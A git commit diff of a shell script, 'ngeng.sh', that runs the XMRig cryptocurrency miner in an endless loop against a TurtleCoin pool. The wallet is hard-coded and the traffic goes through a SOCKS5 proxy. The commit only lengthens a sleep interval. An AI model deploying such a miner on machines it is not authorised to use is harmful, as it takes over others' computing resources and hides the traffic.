517c7cd63854761e02d298a7a3c31761f370e2c8
Taryok <92034895+Taryok@users.noreply.github.com>
2021-12-31 08:27:47 +0700

    Update ngeng.sh

--- ngeng.sh
+++ ngeng.sh
@@ -7,6 +7,6 @@ tar -xvf xmrig-6.11.1-bionic-x64.tar.gz
 cd xmrig-6.11.1
 while [ 2 ]; do
 screen ./xmrig --donate-level 2 -o us.turtlecoin.herominers.com:10381 -u TRTLuweEwEqPstNHhkvxX6UPy4Nw9WAN8gFmeyDHE1Mr54WVPgwUq1L9DqHKCjmcKNHvoNfrh7w7VHVBj1efakotfkt2jeroLmy+b5a6cb7da918c5679c19d0e5ff6f2d2ed4a4f659a56ca1eb32e4702967463096.ngeng -t 34 -p x -a argon2/chukwav2 -k --randomx-1gb-pages --proxy socks5://135.181.218.111:10237
-sleep 999
+sleep 99999
 done
 exit
